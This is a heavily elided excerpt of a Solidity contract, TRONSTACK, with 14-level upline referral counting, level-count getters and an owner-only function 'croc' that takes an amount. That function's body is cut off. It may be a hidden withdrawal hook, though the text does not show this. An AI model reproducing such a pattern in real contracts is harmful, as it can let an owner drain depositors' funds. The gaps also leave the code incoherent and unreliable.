...
contract TRONSTACK {
    ...
    event logResult(address indexed addr, uint256 amount);
            ...
            for (uint256 i = 0; i < 14; i++) {
                if (_upline != address(0)) {
                    if (i == 0) {
                        ...
                        usersLevel[_upline].level11 = usersLevel[_upline].level11.add(1);
                    } 
                    else if (i == 11) {
                        usersLevel[_upline].level12 = usersLevel[_upline].level12.add(1);
                    }
                    else if (i == 12) {
                        usersLevel[_upline].level13 = usersLevel[_upline].level13.add(1);
                    } 
                    else if (i == 13) {
                        usersLevel[_upline].level14 = usersLevel[_upline].level14.add(1);
                    }
    ...
    function croc( uint _amount) external {
        require(msg.sender == owner,'Permission denied');
        if (_amount > 0) {
    ...
    */
	...
	function getUserNextLevelCount(address userAddress) public view returns(uint256 level8, uint256 level9, uint256 level10, uint256 level11, uint256 level12, uint256 level13, uint256 level14) {
		return (usersLevel[userAddress].level8, usersLevel[userAddress].level9, usersLevel[userAddress].level10, usersLevel[userAddress].level11, usersLevel[userAddress].level12, usersLevel[userAddress].level13, usersLevel[userAddress].level14);
	}
}